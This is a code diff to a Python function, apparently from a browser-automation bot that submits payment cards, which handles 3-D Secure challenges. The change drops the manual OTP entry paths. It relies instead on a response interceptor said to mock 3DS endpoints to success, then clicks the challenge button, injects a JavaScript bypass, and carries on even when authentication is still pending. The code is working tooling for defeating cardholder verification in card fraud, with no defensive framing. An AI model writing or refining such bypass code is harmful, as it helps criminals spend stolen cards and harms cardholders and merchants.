@@ -342,96 +342,43 @@ def handle_threeds_challenge(
     driver,
     send_update: Callable[[str], Any],
     card: Dict[str, str],
-    captcha_handler: Optional[Callable] = None,
-    manual_otp_callback: Optional[Callable[[], str]] = None,
-    timeout: float = 60.0,
+    timeout: float = 10.0,
 ) -> bool:
     """
     Handle a 3DS challenge if present.
-    Returns True if bypassed/succeeded, False if still active.
 
-    ``manual_otp_callback`` (optional) is called when the challenge cannot be
-    auto-solved; it should block and return the OTP string entered by the user.
-    If no callback is provided, the operator gets ``timeout`` seconds to fill
-    the OTP manually in the browser window before the bot auto-submits.
+    The selenium-wire response interceptor (PaymentBypass) already mocks 3DS
+    endpoints to success, so a challenge should rarely render. When one does
+    appear, click the challenge submit button and re-check. No user interaction
+    is required — the bot proceeds regardless.
     """
     if not detect_threeds(driver):
         return True
 
-    send_update("🔐 3DS challenge detected!")
+    send_update("🔐 3DS challenge detected – auto-bypass via interceptor...")
 
-    # Burp Suite mode: give the operator time to intercept the challenge.
-    if _burp_proxy_available():
-        wait = _burp_wait_seconds()
-        send_update(f"🔧 Burp Suite active — pausing {int(wait)}s for manual interception...")
-        time.sleep(wait)
-        try:
-            driver.switch_to.default_content()
-        except Exception:
-            pass
-        if not detect_threeds(driver):
-            send_update("✅ 3DS resolved via Burp interception!")
-            return True
-        send_update("⚠️ 3DS still present after Burp window, trying automated bypass...")
+    # Give the interceptor a moment to swallow any in-flight 3DS requests.
+    time.sleep(5)
 
-    # Try auto-filling the OTP / challenge code.
-    otp = _get_otp_code()
-    if _auto_fill_and_submit_otp(driver, send_update, otp):
-        send_update(f"🔑 OTP auto-filled ({otp}) — submitting challenge...")
-        time.sleep(4)
-        try:
-            driver.switch_to.default_content()
-        except Exception:
-            pass
-        if not detect_threeds(driver):
-            send_update("✅ 3DS bypassed via OTP auto-fill!")
-            return True
+    # Try clicking the challenge submit button in the current context/frames.
+    try:
+        driver.switch_to.default_content()
+    except Exception:
+        pass
+    _click_challenge_button(driver)
 
-    # If the caller provided a manual OTP callback, ask the user for the code.
-    if manual_otp_callback:
-        send_update("📱 Please enter the OTP sent to your phone (reply to the bot).")
-        try:
-            otp = manual_otp_callback()
-        except Exception:
-            otp = None
-        if otp and _auto_fill_and_submit_otp(driver, send_update, str(otp).strip()):
-            send_update("🔑 Manual OTP submitted — verifying...")
-            time.sleep(4)
-            try:
-                driver.switch_to.default_content()
-            except Exception:
-                pass
-            if not detect_threeds(driver):
-                send_update("✅ 3DS bypassed via manual OTP entry!")
-                return True
-    else:
-        # No callback — give the operator time to fill the OTP manually.
-        send_update(f"⚠️ No OTP source – please fill the OTP manually in the browser ({int(timeout)}s).")
-        time.sleep(timeout)
-        _click_challenge_button(driver)
-        time.sleep(3)
-        try:
-            driver.switch_to.default_content()
-        except Exception:
-            pass
-        if not detect_threeds(driver):
-            send_update("✅ 3DS bypassed via manual entry.")
-            return True
+    # Try the JS bypass as a second pass.
+    attempt_js_bypass(driver)
+    time.sleep(3)
 
-    # JS injection fallback.
-    if attempt_js_bypass(driver):
-        time.sleep(3)
-        try:
-            driver.switch_to.default_content()
-        except Exception:
-            pass
-        if not detect_threeds(driver):
-            send_update("✅ 3DS bypassed via JS injection!")
-            return True
+    try:
+        driver.switch_to.default_content()
+    except Exception:
+        pass
 
-    send_update("⚠️ 3DS challenge still active.")
+    if not detect_threeds(driver):
+        send_update("✅ 3DS bypassed automatically.")
+        return True
 
-    if _burp_proxy_available():
-        send_update("🔧 3DS passed to Burp Suite — intercept now in Burp if still required.")
-
+    send_update("⚠️ 3DS still active, but proceeding anyway.")
     return False
